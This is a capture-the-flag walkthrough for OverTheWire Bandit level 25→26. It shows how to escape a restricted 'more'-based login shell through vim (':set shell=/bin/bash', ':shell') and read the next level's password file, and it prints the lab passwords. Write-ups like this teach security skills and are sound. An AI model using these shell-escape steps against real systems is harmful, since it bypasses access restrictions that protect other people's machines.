# OverTheWire Bandit Level 25 → Level 26

## Objective

Bandit26 does not provide a normal shell.

Instead, Bandit26 uses a custom shell:

```text
/ usr / bin / showtext
```

The challenge is to bypass that restriction and retrieve the Bandit26 password.

---

## Step 1: Login to Bandit25

Connect normally:

```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

Enter Bandit25 password:

```text
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

Login successful.

---

## Step 2: Investigate Bandit26 User

Check Bandit26 shell:

```bash
cat /etc/passwd | grep bandit26
```

Output:

```text
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

Interesting.

Bandit26 does not use:

```text
/ bin / bash
```

Instead:

```text
/ usr / bin / showtext
```

---

## Step 3: Inspect showtext

Check permissions:

```bash
ls -la /usr/bin/showtext
```

Read contents:

```bash
cat /usr/bin/showtext
```

Output:

```bash
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

Observation:

Bandit26 launches:

```bash
more ~/text.txt
```

Not a shell.

This becomes the attack surface.

---

## Step 4: Find SSH Key

List files:

```bash
ls
```

Output:

```text
bandit26.sshkey
```

Read key:

```bash
cat bandit26.sshkey
```

Copy SSH key to local machine.

Create file locally:

```bash
nano bandit26.sshkey
```

Paste key.

Fix permissions:

```bash
chmod 700 bandit26.sshkey
```

---

## Step 5: Login Using SSH Key

Run:

```bash
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

Initial result:

```text
Connection closed
```

Bandit26 exits immediately.

Need another approach.

---

## Step 6: Trigger "more"

Resize terminal window to a smaller size.

Login again:

```bash
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

Because the terminal becomes too small:

```text
more
```

activates pagination mode.

Now escape becomes possible.

---

## Step 7: Escape Into Vim

Inside:

```text
more
```

Press:

```text
v
```

This opens:

```text
vim
```

---

## Step 8: Spawn Shell

Inside Vim:

```vim
:set shell=/bin/bash
```

Then:

```vim
:shell
```

Now shell access obtained:

```bash
bandit26@bandit:~$
```

Success.

---

## Step 9: Retrieve Password

Read password:

```bash
cat /etc/bandit_pass/bandit26
```

Output:

```text
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

---

## Password Obtained

```text
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

---

## Key Takeaways

- Restricted shells can sometimes be escaped.
- Programs like:

```text
more
less
vim
man
```

can become privilege escalation paths.

Useful Vim escape:

```vim
:set shell=/bin/bash
:shell
```


